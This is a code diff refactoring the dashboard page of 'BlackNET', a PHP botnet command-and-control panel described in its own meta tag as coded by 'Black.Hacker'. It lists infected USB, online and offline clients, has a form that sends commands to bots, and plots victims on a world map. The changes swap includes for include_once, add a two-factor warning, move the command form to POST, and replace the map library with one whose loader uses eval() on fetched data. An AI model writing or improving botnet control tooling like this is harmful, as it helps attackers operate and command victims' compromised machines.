@@ -1,7 +1,7 @@
 <?php
-include 'session.php';
-include 'classes/Clients.php';
-include 'getcontery.php';
+include_once 'session.php';
+include_once 'classes/Clients.php';
+include_once 'getcontery.php';
 
 $client = new Clients;
 $allClients = $client->getClients();
@@ -9,34 +9,17 @@ $allClients = $client->getClients();
 <!DOCTYPE html>
 <html lang="en">
   <head>
-    <meta charset="utf-8">
-    <link rel="shortcut icon" href="favico.png">
-    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-    <meta name="description" content="Botnet Coded By Black.Hacker">
-    <meta name="author" content="Black.Hacker">
+    <?php include_once 'components/meta.php'; ?>
     <title>BlackNET - Main Interface</title>
-    <?php include 'components/css.php'; ?>
+    <?php include_once 'components/css.php'; ?>
     <link href="asset/vendor/datatables/dataTables.bootstrap4.css" rel="stylesheet">
     <link href="asset/vendor/responsive/css/responsive.dataTables.css" rel="stylesheet">
     <link href="asset/vendor/responsive/css/responsive.bootstrap4.css" rel="stylesheet">
-    <style type="text/css">
-      .sticky{
-        display: -webkit-box;
-        display: -ms-flexbox;
-        background-color: #e9ecef;
-        height: 80px;
-        right: 0;
-        bottom: 0; 
-        position: absolute;
-        display: flex;
-        width: 100%;
-        flex-shrink: none;
-      }
-    </style>
+    <link rel="stylesheet" type="text/css" href="asset/vendor/jvector/css/jvector.css">
   </head>
 
   <body id="page-top">
-    <?php include 'components/header.php'; ?>
+    <?php include_once 'components/header.php'; ?>
     <div id="wrapper">
       <div id="content-wrapper">
         <div class="container-fluid">
@@ -44,6 +27,12 @@ $allClients = $client->getClients();
         <div class="alert alert-warning alert-dismissible fade show">
          <a href="#" class="close" data-dismiss="alert" aria-label="close">&times;</a>
          <i class="fa fa-exclamation-triangle"></i><b> Warning!</b> You are loging in as "admin" please change your <b>username</b> for better security.
+        </div>
+       <?php endif; ?>
+       <?php if($user->isTwoFAEnabled($_SESSION['login_user']) == "off"): ?>
+        <div class="alert alert-warning alert-dismissible fade show">
+         <a href="#" class="close" data-dismiss="alert" aria-label="close">&times;</a>
+         <i class="fa fa-exclamation-triangle"></i><b> Warning!</b> Your account is not protected by two-factor authentication. Enable two-factor authentication now from <a href="authsettings.php" class="alert-link">here</a>.
         </div>
        <?php endif; ?>
           <ol class="breadcrumb">
@@ -70,7 +59,7 @@ $allClients = $client->getClients();
                 <div class="card-body-icon">
                   <i class="fab fa-fw fa-usb"></i>
                 </div>
-                <div class="mr-5"><?php echo $client->countClientByUSB(); ?> USB Clients!</div>
+                <div class="mr-5"><?php echo $client->countClientsByCond("is_usb","yes"); ?> USB Clients!</div>
               </div>
               <div class="card-footer text-white clearfix small z-1" ></div>
             </div>
@@ -82,7 +71,7 @@ $allClients = $client->getClients();
                 <div class="card-body-icon">
                   <i class="fas fa-fw fa-signal"></i>
                 </div>
-                <div class="mr-5"><?php echo $client->countOnlineClients(); ?> Online Clients!</div>
+                <div class="mr-5"><?php echo $client->countClientsByCond("status","Online"); ?> Online Clients!</div>
               </div>
               <div class="card-footer text-white clearfix small z-1" ></div>
             </div>
@@ -94,15 +83,15 @@ $allClients = $client->getClients();
                 <div class="card-body-icon">
                   <i class="fas fa-fw fa-user-slash"></i>
                 </div>
-                <div class="mr-5"><?php echo $client->countOfflineClients(); ?> Offline Clients!</div>
+                <div class="mr-5"><?php echo $client->countClientsByCond("status","Offline"); ?> Offline Clients!</div>
               </div>
               <div class="card-footer text-white clearfix small z-1" ></div>
             </div>
           </div>
         </div>
 
-          <form method="GET" action="sendcommand.php" id="Form1" name="Form1">
-          <input type="text" name="csrf" hidden="" value="<?php echo($csrf)  ?>">
+          <form method="POST" action="sendcommand.php" id="Form1" name="Form1">
+          <input type="text" name="csrf" hidden="" value="<?php echo($csrf)  ?>" />
           <div class="card mb-3">
             <div class="card-header">
               <i class="fas  fa-user-circle"></i>
@@ -220,7 +209,7 @@ $allClients = $client->getClients();
                       </select>
                    </td>
                    <td>
-                    <button type="submit" for="Form1" class="btn btn-block btn-dark">Send Command</button>
+                    <button type="submit" name="Form1" for="Form1" class="btn btn-block btn-dark">Send Command</button>
                    </td>
                   </tr>
                   </tbody>
@@ -236,12 +225,17 @@ $allClients = $client->getClients();
               Map Visualization 
             </div>
             <div class="card-body">
-              <div id="clientmap" name="clientmap"></div>
+              <div class="map-container">
+                <div id="clientmap" name="clientmap" class="jvmap-smart" ></div>
+              </div>
           </div>
         </div>
         </div>
       </div>
     </form>
+  </div>
+</div>
+</div>
 
     <?php include_once 'components/footer.php'; ?>
 
@@ -252,39 +246,57 @@ $allClients = $client->getClients();
     <script src="asset/vendor/responsive/dataTables.responsive.js"></script>
     <script src="asset/vendor/responsive/responsive.bootstrap4.js"></script>
     <script src="asset/js/demo/datatables-demo.js"></script>
-    <script src="asset/vendor/amcharts/core.js"></script>
-    <script src="asset/vendor/amcharts/maps.js"></script>
-    <script src="asset/vendor/amcharts/geodata/worldLow.js"></script>
-    <script src="asset/vendor/amcharts/themes/material.js"></script>
+    <script src="asset/vendor/jvector/js/core.js"></script>
+    <script src="asset/vendor/jvector/js/world.js"></script>
     <script>
       $('.alert').alert();
-      $('#select-all').click(function(event) {if(this.checked) {$(':checkbox').each(function() { this.checked = true; });} else {$(':checkbox').each(function() { this.checked = false; });}});
+
+      $('#select-all').click(function(event) {
+        if(this.checked) {
+          $(':checkbox').each(function() {
+           this.checked = true; 
+         });
+
+        } else {
+          
+          $(':checkbox').each(function() { 
+            this.checked = false;
+          });
+        }
+      });
 
       document.addEventListener("DOMContentLoaded", function(){
-      am4core.ready(function() {
-            am4core.useTheme(am4themes_material);
-            var chart = am4core.create("clientmap", am4maps.MapChart);
-            chart.geodata = am4geodata_worldLow;
-            chart.projection = new am4maps.projections.Miller();
+        $.getJSON('counter.php',{}, function(data) {
+          var dataC = eval(data);
+          var clients = [];
+          $.each(dataC.countries, function() {
+            clients[this.id] = this.value;
+          });
 
+        $('#clientmap').vectorMap({
+            map: 'world_mill',
+            backgroundColor: 'transparent',
+            series: {
+              regions: [{
+                values: clients,
+                scale: ['#e6e6e6', '#007bff'],
+                normalizeFunction: 'polynomial'
+              }]
+            },
+            regionStyle: {
+              hover:{
+                fill: '#0056b3',
+                cursor: 'pointer'
+              }
+            },
 
-            var worldSeries = chart.series.push(new am4maps.MapPolygonSeries());
-            worldSeries.useGeodata = true;
-            worldSeries.exclude = ["AQ","SS","XK"];
-
-            var polygonTemplate = worldSeries.mapPolygons.template;
-            polygonTemplate.nonScalingStroke = true;
-            polygonTemplate.tooltipText = "{name}: {value}";
-            worldSeries.dataSource.url = "counter.php";
-            worldSeries.dataSource.parser = new am4core.JSONParser();
-            worldSeries.heatRules.push({"property": "fill","target": worldSeries.mapPolygons.template,"min": am4core.color("#e6e6e6"),"max": am4core.color("#007bff")});
-
-            chart.smallMap = new am4maps.SmallMap();
-            chart.smallMap.series.push(worldSeries);
-
-            var hs = polygonTemplate.states.create("hover");
-            hs.properties.fill = am4core.color("#0056b3");
-          })          
+            onRegionTipShow: function(e, el, code){
+              if(typeof clients[code]!='undefined'){
+                 el.html(el.html()+' ('+clients[code]+' Clients)');
+              }
+            }
+          });
+        });
       });
   </script>
   </body>
